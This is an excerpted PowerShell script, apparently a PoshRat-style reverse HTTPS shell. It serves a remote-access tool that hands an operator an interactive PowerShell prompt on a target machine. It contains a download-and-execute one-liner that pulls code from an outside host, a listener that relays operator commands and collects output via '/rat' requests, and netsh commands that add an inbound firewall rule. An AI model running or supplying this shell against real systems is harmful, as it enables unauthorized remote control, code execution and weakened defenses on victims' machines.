...
This script is a minimalist reverse HTTPS Shell
...
Provides and Interactive PowerShell prompt via HTTPS
...
iex (New-Object Net.WebClient).DownloadString("http://10.0.0.16/connect")
...
function Receive-ClientHttpsRequest([System.Net.Sockets.TcpClient] $client)
	{
		...
		Write-Host "Secure Connect Request Received" -Fore White
		...
		$SSLURL = $SSLParse[1]
		$SSLResponse = "HTTP/1.1 200 OK`r`nContent-Type: text/xml; charset=utf-8`r`nPostRat: DFIR`r`n`r`n"

		if ($SSLURL -eq '/rat' -and ($SSLMethod -eq "POST") ) { 
			Write-Host ([System.Text.Encoding]::Ascii.GetString($SSLbyteClientRequest))
		}
		if ($SSLUrl -eq '/rat' -and ($SSLMethod-eq "GET")) {  
			
			$Command = Read-Host "PS Target>"
			$SSLResponse += "$Command"
...
$func = {
	...
	function Receive-ClientHttpRequest
	{
	param (
            [parameter(Mandatory=$true,ValueFromPipeline=$true)]
            [string]$CertPinThumbprint,
			[parameter(Mandatory=$true,ValueFromPipeline=$true)]
            [string]$Server
        )
		...
		netsh advfirewall firewall delete rule name="PoshRat Connect 80" | Out-Null
		netsh advfirewall firewall add rule name="PoshRat Connect 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
		...
		while ($true) {
			...
			#Used For One-Liner Start
			if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
				
				$message += '$SSLThumbprint = "'+$CertPinThumbprint+'"
				...
				$response.AddHeader("PoshRat", "DFIR")
...
function Main()
	{	
		...
		Write-Host $CertPinThumbprint -fore Yellow 
		$Client = New-Object System.Net.Sockets.TcpClient
		$Client.NoDelay = $true
		
		Start-Job -ScriptBlock {Receive-ClientHttpRequest $args[0] $args[1]} -ArgumentList @($CertPinThumbprint, $Server) -InitializationScript $func
